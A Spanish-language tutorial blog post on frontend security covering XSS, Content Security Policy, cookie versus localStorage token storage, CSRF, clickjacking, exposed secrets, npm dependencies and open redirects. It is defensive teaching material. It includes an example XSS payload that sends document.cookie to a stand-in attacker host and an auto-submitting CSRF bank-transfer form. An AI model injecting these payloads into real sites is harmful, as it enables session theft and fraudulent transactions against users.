---
title: 'Seguridad en el frontend: XSS, CSRF, tokens y buenas prácticas'
description: 'Los ataques más comunes contra el frontend y cómo evitarlos: XSS e innerHTML, Content Security Policy, dónde guardar tokens (cookies HttpOnly frente a localStorage), CSRF y SameSite, clickjacking, secretos en el código, dependencias, enlaces externos y validación.'
date: 2026-11-27
series: seguridad
tags: [Seguridad, Frontend, XSS, CSRF, Intermedio]
draft: true
---

"La seguridad es cosa del backend." Es uno de los mitos más peligrosos. Es verdad que el servidor es la última línea de defensa, pero muchos de los ataques más comunes de la web **ocurren en el navegador**, y se cuelan por decisiones del frontend: un `innerHTML` mal puesto, un token guardado en el sitio equivocado, una clave de API en el código.

Este post repasa los ataques que todo desarrollador frontend debe conocer y, sobre todo, **cómo evitarlos**. No necesitas ser experto en seguridad: necesitas buenos hábitos.

## La regla de oro: nunca confíes en el navegador

Todo lo que pasa en el navegador lo **controla el usuario**. Puede abrir las DevTools, cambiar el HTML, saltarse tu validación, modificar las peticiones o llamar a tu API directamente con `curl`.

Así que:

- La **validación del frontend** es para la **experiencia de usuario** (avisar rápido de un error). La que te **protege** es la del **backend** (lo viste en el post de Zod en formularios).
- **Ocultar un botón** no protege nada. Si un usuario normal no debe poder borrar productos, el **servidor** debe comprobar sus permisos en cada petición.
- **Todo el código del frontend es público.** Cualquiera puede leerlo.

## 1. XSS: cuando tu web ejecuta el código de otro

**XSS** (*Cross-Site Scripting*) es el ataque más común del frontend. Ocurre cuando tu web **muestra texto que viene de un usuario como si fuera HTML**, y ese texto contiene código.

Imagina una sección de comentarios:

```js
// ❌ PELIGROSO
const comentario = obtenerComentarioDeLaApi()
contenedor.innerHTML = `<p>${comentario.texto}</p>`
```

Si un atacante escribe este "comentario":

```html
<img src="x" onerror="fetch('https://atacante.com/robar?c=' + document.cookie)">
```

Cada persona que vea los comentarios **ejecutará ese código en su navegador**, dentro de tu web, con acceso a todo: puede leer lo que hay en pantalla, hacer peticiones a tu API en nombre del usuario, robar tokens de `localStorage` o cambiar el formulario de pago por uno falso.

### Cómo evitarlo

**Usa `textContent` en lugar de `innerHTML`** para mostrar texto:

```html playground=xss
<p>Comentario con innerHTML:</p>
<div id="peligroso"></div>
<p>Comentario con textContent:</p>
<div id="seguro"></div>
```

```js playground=xss
const comentario = '<img src="x" onerror="alert(\'¡Te hackeé!\')"> Buen post'

document.querySelector('#peligroso').innerHTML = comentario   // ❌ ejecuta el código
document.querySelector('#seguro').textContent = comentario    // ✅ lo muestra como texto
```

Ábrelo en el playground: el primero ejecuta el `alert`; el segundo muestra el texto tal cual, inofensivo. `textContent` **nunca** interpreta HTML.

Más reglas:

- **Los frameworks te protegen por defecto.** En React, `{comentario}` dentro del JSX se escapa automáticamente; en Vue, `{{ comentario }}` también. El peligro está en las salidas de emergencia: **`dangerouslySetInnerHTML`** en React y **`v-html`** en Vue. Si los usas con datos de usuarios, estás abriendo la puerta.
- **Si de verdad necesitas HTML de usuarios** (un editor de texto enriquecido, Markdown), **límpialo** con una librería como **DOMPurify** antes de mostrarlo: `elemento.innerHTML = DOMPurify.sanitize(html)`.
- **Cuidado con las URLs.** `<a href={urlDelUsuario}>` puede ser `javascript:alert(1)`. Comprueba que empieza por `https://` antes de usarla.
- **Nunca** uses `eval()`, `new Function(texto)` ni `setTimeout('texto de código')` con datos externos.

## 2. Content Security Policy: la red de seguridad

Aunque se te escape un XSS, puedes limitar el daño con una **Content Security Policy** (CSP): una cabecera HTTP que le dice al navegador **de dónde puede cargar y ejecutar código** tu web.

```bash
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' https://images.miweb.com; connect-src 'self' https://api.miweb.com; object-src 'none'; frame-ancestors 'none'
```

Se lee así:

- **`default-src 'self'`**: por defecto, solo recursos de mi propio dominio.
- **`script-src 'self'`**: solo scripts de mis archivos. Como no incluye `'unsafe-inline'`, los scripts **en línea** (como el `onerror="..."` del ataque) **no se ejecutan**.
- **`img-src`**, **`connect-src`**: de dónde se pueden cargar imágenes y a dónde se puede hacer `fetch`. Aunque un atacante inyecte código, no podría enviar los datos robados a `atacante.com`.
- **`frame-ancestors 'none'`**: nadie puede meter tu web en un `<iframe>` (lo verás en el clickjacking).

La CSP se configura en el servidor o en tu plataforma de despliegue (Vercel, Netlify, Nginx...). Empieza con la cabecera **`Content-Security-Policy-Report-Only`**: no bloquea nada, pero avisa en la consola de lo que bloquearía. Así la ajustas sin romper tu web.

## 3. Dónde guardar los tokens de sesión

Cuando un usuario inicia sesión, el servidor le da un **token** (una "pulsera" que demuestra quién es). ¿Dónde lo guardas?

| | `localStorage` | Cookie `HttpOnly` |
| --- | --- | --- |
| ¿Lo puede leer JavaScript? | **Sí** | **No** |
| Si hay un XSS... | El atacante **roba el token** y lo usa desde su ordenador | No puede leerlo |
| ¿Se envía solo en cada petición? | No, lo añades tú | Sí, el navegador lo hace |
| Riesgo propio | XSS | CSRF (se soluciona con `SameSite`) |

La recomendación general para apps web: guarda la sesión en una **cookie** con estas opciones, que pone el **servidor**:

```bash
Set-Cookie: sesion=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400
```

- **`HttpOnly`**: JavaScript no puede leerla (`document.cookie` no la ve). Un XSS no puede robarla.
- **`Secure`**: solo se envía por HTTPS.
- **`SameSite=Lax`**: no se envía en peticiones que vienen de otras webs (te protege del CSRF, a continuación).
- **`Max-Age`**: caduca sola.

Y en el frontend, para que `fetch` envíe las cookies a tu API en otro subdominio: `fetch(url, { credentials: 'include' })`.

Guardar tokens en `localStorage` es muy común en tutoriales porque es sencillo, pero convierte cualquier XSS en un robo de cuentas. Si tienes que hacerlo, que los tokens **duren poco** y extrema las precauciones contra XSS.

## 4. CSRF: peticiones en tu nombre desde otra web

**CSRF** (*Cross-Site Request Forgery*) es el problema contrario de las cookies: como el navegador las envía **automáticamente**, una web maliciosa puede hacer que **tu navegador** haga una petición a tu banco, **con tus cookies**:

```html
<!-- En https://web-maliciosa.com -->
<form action="https://mi-banco.com/transferir" method="POST">
  <input type="hidden" name="destino" value="cuenta-del-atacante">
  <input type="hidden" name="cantidad" value="1000">
</form>
<script>document.forms[0].submit()</script>
```

Si estás conectado a tu banco y visitas esa web, el formulario se envía... con tu cookie de sesión.

Cómo se evita:

- **`SameSite=Lax`** (o `Strict`) en las cookies de sesión: el navegador no las envía en peticiones `POST` que vienen de otro sitio. Es la defensa principal hoy, y los navegadores modernos aplican `Lax` por defecto si la cookie no lo indica.
- **No cambiar datos con `GET`**: borrar, comprar o transferir siempre con `POST`, `PUT`, `PATCH` o `DELETE` (como viste en el post de API REST).
- **Tokens anti-CSRF** en los formularios, para aplicaciones que necesiten más protección (muchos frameworks del backend los traen).

## 5. Clickjacking: clics robados

Un atacante mete **tu web en un `<iframe>` invisible** encima de un botón de su página ("¡Haz clic para ganar un iPhone!"). El usuario cree que hace clic en el botón del atacante, pero en realidad hace clic en **tu** botón de "Borrar cuenta" o "Confirmar pago".

Se evita impidiendo que otras webs te incrusten, con una cabecera:

```bash
Content-Security-Policy: frame-ancestors 'none'
```

(O la antigua `X-Frame-Options: DENY`, que hace lo mismo.)

## 6. Los secretos no van en el frontend

**Todo** lo que pones en el código del frontend llega al navegador del usuario, también las variables de entorno:

```js
// ❌ Esto es público: cualquiera lo ve en las DevTools
const STRIPE_SECRET = import.meta.env.VITE_STRIPE_SECRET_KEY
fetch('https://api.openai.com/v1/...', { headers: { Authorization: `Bearer ${CLAVE_DE_OPENAI}` } })
```

Las variables con prefijo `VITE_` (en Vite) o `NEXT_PUBLIC_` (en Next.js) **se copian dentro del JavaScript** que descarga el usuario. Cualquiera puede abrir la pestaña Sources o Network y copiar tu clave.

- ✅ **Claves públicas** (están hechas para el navegador): la clave publicable de Stripe, la de Google Maps restringida a tu dominio, la URL de tu API.
- ❌ **Claves secretas** (de pagos, de IA, de bases de datos, de email): **siempre en el backend**. El frontend llama a **tu** API, y tu API usa la clave secreta. Si no tienes backend, una función serverless (como Lambda, en la serie de DevOps) sirve.

## 7. Dependencias: el código que no escribiste

Tu proyecto tiene cientos de paquetes de npm, escritos por miles de personas. Si uno tiene una vulnerabilidad, o alguien malicioso publica una versión infectada, entra en tu web.

```bash
npm audit                # revisa vulnerabilidades conocidas en tus dependencias
npm audit fix            # actualiza las que se pueden arreglar sin romper nada
```

Buenas prácticas:

- **Sube el `package-lock.json`** y usa `npm ci` en CI: instala exactamente las versiones revisadas.
- **Antes de instalar un paquete**, mira cuántas descargas tiene, cuándo se actualizó y si el nombre es exactamente el que buscas (existen paquetes con nombres casi iguales, como `reacct`, creados para engañar).
- **Activa Dependabot** (o Renovate) en GitHub: te abre *pull requests* para actualizar dependencias con vulnerabilidades.
- **Si cargas scripts de un CDN**, usa **Subresource Integrity** (`integrity="sha384-..."`): si el archivo del CDN cambia, el navegador no lo ejecuta.

## 8. Enlaces y redirecciones

Los enlaces que abren otra pestaña:

```html
<a href="https://otra-web.com" target="_blank" rel="noopener noreferrer">Enlace externo</a>
```

`rel="noopener"` impide que la página abierta controle la tuya a través de `window.opener` (los navegadores modernos ya lo aplican por defecto con `target="_blank"`, pero ponerlo no cuesta nada). `noreferrer` además no le dice de dónde vienes.

Y cuidado con las **redirecciones abiertas**: si tu web hace `location.href = parametros.get('volverA')` después del login, un atacante puede enviar un enlace `tuweb.com/login?volverA=https://web-falsa.com` que, tras un login real, lleva a una copia falsa de tu web. Redirige solo a rutas internas (`/perfil`) o a una lista de destinos permitidos.

## Lista de comprobación

- [ ] Muestro datos de usuarios con `textContent` o con las llaves de React/Vue, nunca con `innerHTML`, `v-html` o `dangerouslySetInnerHTML` sin limpiar.
- [ ] Tengo una **Content Security Policy** (aunque sea empezando por `Report-Only`).
- [ ] La sesión va en una cookie **`HttpOnly`, `Secure` y `SameSite`**.
- [ ] Nunca cambio datos con peticiones `GET`.
- [ ] Mi web no se puede incrustar en iframes de otros (`frame-ancestors`).
- [ ] No hay **claves secretas** en el código del frontend ni en variables `VITE_`/`NEXT_PUBLIC_`.
- [ ] Reviso las dependencias con `npm audit` y Dependabot.
- [ ] Todo se valida **también en el servidor**, incluidos los permisos.
- [ ] Todo va por **HTTPS**.

## Tu turno

1. En el playground, prueba otros ataques XSS en el `innerHTML` (un `<svg onload=...>`, un enlace con `href="javascript:..."`) y comprueba que `textContent` los neutraliza todos.
2. Busca en un proyecto tuyo todos los `innerHTML`, `v-html` y `dangerouslySetInnerHTML`, y decide si alguno muestra datos de usuarios.
3. Ejecuta `npm audit` en un proyecto tuyo y lee qué vulnerabilidades tiene.
4. Revisa las cabeceras de seguridad de tu web en [securityheaders.com](https://securityheaders.com) y añade las que falten.

## Errores comunes

- **"Está oculto en el frontend, así que es seguro."** Todo el frontend es público y modificable.
- **`innerHTML` con datos de usuarios** o de APIs.
- **Tokens de sesión en `localStorage`** sin pensar en el riesgo de XSS.
- **Claves secretas en variables de entorno del frontend.**
- **Validar solo en el frontend.**
- **Ignorar los avisos de `npm audit`** durante meses.

## Para profundizar

- [OWASP Top 10: los riesgos de seguridad web más críticos (en inglés)](https://owasp.org/www-project-top-ten/)
- [Seguridad web en MDN](https://developer.mozilla.org/es/docs/Web/Security)

En resumen: **nunca confíes en el navegador**: valida y comprueba permisos en el servidor. Evita el **XSS** mostrando datos con **`textContent`** (o las llaves de React y Vue) y limitando el daño con una **Content Security Policy**. Guarda la sesión en cookies **`HttpOnly`, `Secure` y `SameSite`** (que además frenan el **CSRF**), impide el **clickjacking** con `frame-ancestors`, no pongas **secretos** en el código del frontend y vigila tus **dependencias** con `npm audit`.
